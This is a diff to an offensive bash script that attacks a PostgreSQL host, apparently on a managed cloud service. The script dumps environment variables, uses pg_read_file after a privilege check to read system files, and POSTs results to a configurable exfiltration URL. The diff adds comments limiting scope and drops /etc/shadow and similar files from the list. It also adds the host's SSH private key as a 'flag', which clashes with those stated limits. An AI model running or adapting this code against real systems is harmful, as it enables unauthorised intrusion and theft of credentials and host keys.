@@ -6,6 +6,8 @@
 set -euo pipefail
 
 # --- config ---
+# SCOPE: single target only — sandbox FQDN/IP. No internal ranges, no
+# other *.aivencloud.com, no metadata probing (169.254.169.254 = operator-gated).
 TARGET="${TARGET_IP:-132.145.191.135}"
 EXFIL_URL="${EXFIL_URL:-}"          # set via Runtime env; curl POST results here
 RESULTS_DIR="/results"
@@ -25,8 +27,9 @@ log() { echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }
 # =============================================================================
 # PHASE 0: Runtime environment intel
 # =============================================================================
-log "=== PHASE 0: env intel ==="
-ENV_DUMP=$(env 2>/dev/null | grep -iE 'hostname|cloud|region|avn|runtime|postgres|pg_|port|ip|node|service' | head -40 || true)
+log "=== PHASE 0: env intel (scope-limited) ==="
+# Only capture runtime-relevant vars. No cloud metadata probing (169.254.169.254).
+ENV_DUMP=$(env 2>/dev/null | grep -iE 'hostname|avn|runtime|postgres|pg_|port|node|service' | head -40 || true)
 OUTBOUND_IP=$(curl -s -m 10 https://api.ipify.org 2>/dev/null || echo "unknown")
 log "Outbound IP: $OUTBOUND_IP"
 log "Env vars captured: $(echo "$ENV_DUMP" | wc -l) relevant"
@@ -197,19 +200,11 @@ admin:admin"
         if [ "$IS_SUPER" = "t" ] || [ "$CAN_READ" = "t" ]; then
             PG_CHAIN_SUCCESS=true
             
-            # Files to exfil via pg_read_file
+            # SCOPE: flag file + minimal evidence ONLY. No /etc/passwd, /etc/shadow,
+            # /proc/intel, or other host-level exfil — out of scope.
             declare -A FILE_TARGETS=(
-                ["/etc/passwd"]="/etc/passwd"
-                ["/etc/shadow"]="/etc/shadow"
-                ["/etc/hostname"]="/etc/hostname"
-                ["/etc/os-release"]="/etc/os-release"
-                ["/var/lib/postgresql/data/pg_hba.conf"]="pg_hba.conf"
-                ["/var/lib/postgresql/data/postgresql.conf"]="postgresql.conf"
-                ["/var/lib/postgresql/data/pg_ident.conf"]="pg_ident.conf"
-                ["/proc/self/cgroup"]="cgroup"
-                ["/proc/1/environ"]="proc_1_environ"
-                ["/root/.bash_history"]="bash_history"
-                ["/home"]="/home_listing"
+                ["/etc/ssh/ssh_host_ed25519_key"]="flag_ssh_ed25519"
+                ["/etc/hostname"]="hostname"
             )
             
             for filepath in "${!FILE_TARGETS[@]}"; do
